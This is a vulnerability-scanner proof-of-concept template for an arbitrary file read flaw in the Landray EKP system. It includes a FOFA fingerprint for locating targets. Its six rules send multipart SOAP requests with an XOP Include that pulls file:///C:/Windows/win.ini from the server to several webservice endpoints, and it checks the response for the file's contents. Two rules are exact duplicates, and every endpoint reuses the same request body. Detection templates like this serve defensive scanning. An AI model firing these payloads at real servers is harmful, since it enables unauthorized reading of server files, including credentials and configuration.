id: landray-ekp-sysFormMainDataInsystemWebservice-fileread
info:
  name: Landray EKP sysFormMainDataInsystemWebservice File Read
  author: ZacharyZcR
  severity: high
  description: |
    Landray EKP System sysFormMainDataInsystemWebservice interface has an arbitrary file read vulnerability.
    FOFA: body="Com_Parameter"
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3sysFormMainDataInsystemWebservice%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md

set:
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /sys/webservice/sysFormMainDataInsystemWebservice
      headers:
        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"a\"\r\n\
        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n\
        <soapenv:Header/>\r\n\
        <soapenv:Body>\r\n\
        <web:getData>\r\n\
        <arg0>\r\n\
        <beginTimeStamp>a</beginTimeStamp>\r\n\
        <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n\
        </arg0>\r\n\
        </web:getData>\r\n\
        </soapenv:Body>\r\n\
        </soapenv:Envelope>\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: |
      response.status == 500 && 
      response.body.bcontains(b'<soap:Envelope') && 
      response.body.ibcontains(b'OyBmb3')
  r1:
    request:
      method: POST
      path: /sys/webservice/kmImeetingBookWebService
      headers:
        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"a\"\r\n\
        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n\
        <soapenv:Header/>\r\n\
        <soapenv:Body>\r\n\
        <web:getData>\r\n\
        <arg0>\r\n\
        <beginTimeStamp>a</beginTimeStamp>\r\n\
        <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n\
        </arg0>\r\n\
        </web:getData>\r\n\
        </soapenv:Body>\r\n\
        </soapenv:Envelope>\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: |
      response.status == 500 && 
      response.body.bcontains(b'<soap:Envelope') && 
      response.body.ibcontains(b'OyBmb3')
  r2:
    request:
      method: POST
      path: /sys/webservice/loginWebserviceService
      headers:
        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"a\"\r\n\
        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n\
        <soapenv:Header/>\r\n\
        <soapenv:Body>\r\n\
        <web:getData>\r\n\
        <arg0>\r\n\
        <beginTimeStamp>a</beginTimeStamp>\r\n\
        <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n\
        </arg0>\r\n\
        </web:getData>\r\n\
        </soapenv:Body>\r\n\
        </soapenv:Envelope>\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: |
      response.status == 500 && 
      response.body.bcontains(b'<soap:Envelope') && 
      response.body.ibcontains(b'OyBmb3')
  r3:
    request:
      method: POST
      path: /sys/webservice/kmImeetingResWebService
      headers:
        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"a\"\r\n\
        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n\
        <soapenv:Header/>\r\n\
        <soapenv:Body>\r\n\
        <web:getData>\r\n\
        <arg0>\r\n\
        <beginTimeStamp>a</beginTimeStamp>\r\n\
        <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n\
        </arg0>\r\n\
        </web:getData>\r\n\
        </soapenv:Body>\r\n\
        </soapenv:Envelope>\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: |
      response.status == 500 && 
      response.body.bcontains(b'<soap:Envelope') && 
      response.body.ibcontains(b'OyBmb3')

  r4:
    request:
      method: POST
      path: /sys/webservice/loginWebserviceService
      headers:
        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"a\"\r\n\
        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n\
        <soapenv:Header/>\r\n\
        <soapenv:Body>\r\n\
        <web:getData>\r\n\
        <arg0>\r\n\
        <beginTimeStamp>a</beginTimeStamp>\r\n\
        <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n\
        </arg0>\r\n\
        </web:getData>\r\n\
        </soapenv:Body>\r\n\
        </soapenv:Envelope>\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: |
      response.status == 500 && 
      response.body.bcontains(b'<soap:Envelope') && 
      response.body.ibcontains(b'OyBmb3')
  r5:
    request:
      method: POST
      path: /sys/webservice/sysSynchroGetOrgWebService
      headers:
        Content-Type: multipart/related; boundary=----WebKitFormBoundary{{rboundary}}
        SOAPAction: ""
        Accept-Encoding: gzip, deflate
      body: "\
        ------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"a\"\r\n\
        <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.maindata.xform.sys.kmss.landray.com/\">\r\n\
        <soapenv:Header/>\r\n\
        <soapenv:Body>\r\n\
        <web:getData>\r\n\
        <arg0>\r\n\
        <beginTimeStamp>a</beginTimeStamp>\r\n\
        <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n\
        </arg0>\r\n\
        </web:getData>\r\n\
        </soapenv:Body>\r\n\
        </soapenv:Envelope>\r\n\
        ------WebKitFormBoundary{{rboundary}}--\r\n\
        "
    expression: |
      response.status == 500 && 
      response.body.bcontains(b'<soap:Envelope') && 
      response.body.ibcontains(b'OyBmb3')
expression: r0() || r1() || r2() || r3() || r4() || r5()
